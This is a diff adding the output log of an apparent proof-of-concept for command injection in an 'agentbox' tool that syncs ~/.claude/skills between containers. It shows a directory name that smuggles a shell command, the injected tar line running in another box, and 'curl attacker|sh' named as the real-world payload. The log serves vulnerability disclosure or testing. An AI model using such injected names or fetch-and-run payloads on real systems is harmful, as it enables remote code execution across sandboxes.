@@ -1,0 +1,19 @@
+
+== 1. Attacker plants a malicious skill directory name in the SOURCE box ==
+   source ~/.claude/skills/ entry: legit-skill;touch${IFS}/tmp/agentbox-xbox-poc.ncVs11/RCE_IN_TARGET_BOX|sh
+
+== 2. Victim runs `download claude <attacker-box> --propagate` -> real sync transport into the TARGET box ==
+   propagate computes boxDestDir = /home/vscode/.claude/skills/legit-skill;touch${IFS}/tmp/agentbox-xbox-poc.ncVs11/RCE_IN_TARGET_BOX|sh
+   calling the REAL transport.pushTree(...) -> applyTarball(...) (sync-transport.ts sink)
+tar: /tmp/agentbox-apply-0.tar: Cannot open: No such file or directory
+tar: Error is not recoverable: exiting now
+sh: 0: Illegal option --
+   (pushTree threw after the injection ran, as expected: cloud tar extract into /home/vscode/.claude/skills/legit-skill;touch${...)
+
+== 3. Result ==
+   command applyTarball ran in the target box:
+     tar -xf /tmp/agentbox-apply-0.tar -C /home/vscode/.claude/skills/legit-skill;touch${IFS}<MARKER>|sh --no-same-permissions --no-same-owner -m && rm -f /tmp/agentbox-apply-0.tar
+
+VULNERABLE -- a box-controlled name executed a command inside a DIFFERENT box.
+   marker created in the target box context: /tmp/agentbox-xbox-poc.ncVs11/RCE_IN_TARGET_BOX
+   In production the payload would be e.g. `curl attacker|sh`, running as the target box user (passwordless sudo).
